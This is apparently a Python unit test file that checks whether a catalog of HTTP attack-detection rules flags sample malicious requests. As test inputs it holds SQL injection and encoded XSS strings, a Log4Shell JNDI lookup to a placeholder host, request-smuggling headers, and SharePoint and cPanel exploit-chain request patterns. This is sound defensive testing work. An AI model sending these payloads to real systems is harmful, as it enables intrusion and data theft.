#!/usr/bin/env python3

import json
import unittest
from pathlib import Path

from scripts.evaluate_catalog import evaluate

ROOT = Path(__file__).resolve().parents[1]
CATALOG = json.loads((ROOT / "rules" / "http-attacks.json").read_text(encoding="utf-8"))


class CatalogTests(unittest.TestCase):
    def assert_hits(self, event, *expected):
        actual = {rule["id"] for rule in evaluate(CATALOG, event)}
        self.assertTrue(set(expected) <= actual, (expected, sorted(actual)))

    def test_sqli_double_encoded(self):
        self.assert_hits({"clientrequesturi": "/search?q=1%2520UNION%2520SELECT%2520password"}, "http.sqli.generic")

    def test_xss_encoded(self):
        self.assert_hits({"clientrequesturi": "/?q=%253Cscript%253Ealert(1)%253C/script%253E"}, "http.xss.generic")

    def test_log4shell_header(self):
        self.assert_hits({"requestheaders": {"X-Api-Version": "${jndi:ldap://example.invalid/a}"}}, "http.exploit.log4shell")

    def test_request_smuggling(self):
        self.assert_hits({"requestheaders": {"Content-Length": "4", "Transfer-Encoding": "chunked"}}, "http.protocol.request-smuggling")

    def test_sharepoint_chain(self):
        self.assert_hits({
            "clientrequestmethod": "POST",
            "clientrequesturi": "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=%2FToolPane.aspx",
            "clientrequestreferer": "https://sharepoint.example/_layouts/15/signout.aspx"
        }, "http.exploit.sharepoint-toolpane")

    def test_cpanel_chain(self):
        self.assert_hits({
            "clientrequestmethod": "GET", "clientrequestpath": "/", "edgeresponsestatus": 302,
            "requestheaders": {"Authorization": "Basic Zm9vOmJhcg=="},
            "responseheaders": {"Location": "/cpsess1234567890/"}
        }, "http.exploit.cpanel-crlf-auth-bypass")

    def test_clean_request(self):
        self.assertEqual(evaluate(CATALOG, {
            "clientrequestmethod": "GET", "clientrequesturi": "/products?page=2",
            "clientrequestpath": "/products", "clientrequestuseragent": "Mozilla/5.0",
            "edgeresponsestatus": 200, "requestheaders": {"Accept": "text/html"}
        }), [])

    def test_request_body_sqli(self):
        self.assert_hits({"requestbody": "username=a' UNION SELECT password FROM users"}, "http.sqli.request-body")

    def test_raw_duplicate_header(self):
        self.assert_hits({"requestheadersraw": ["Host: example.test", "Content-Length: 4", "Content-Length: 9"]}, "http.protocol.duplicate-raw-header")

    def test_response_information_leakage(self):
        self.assert_hits({"responsebody": "Fatal error: Uncaught RuntimeException Stack trace:"}, "http.response.information-leakage")


if __name__ == "__main__":
    unittest.main()
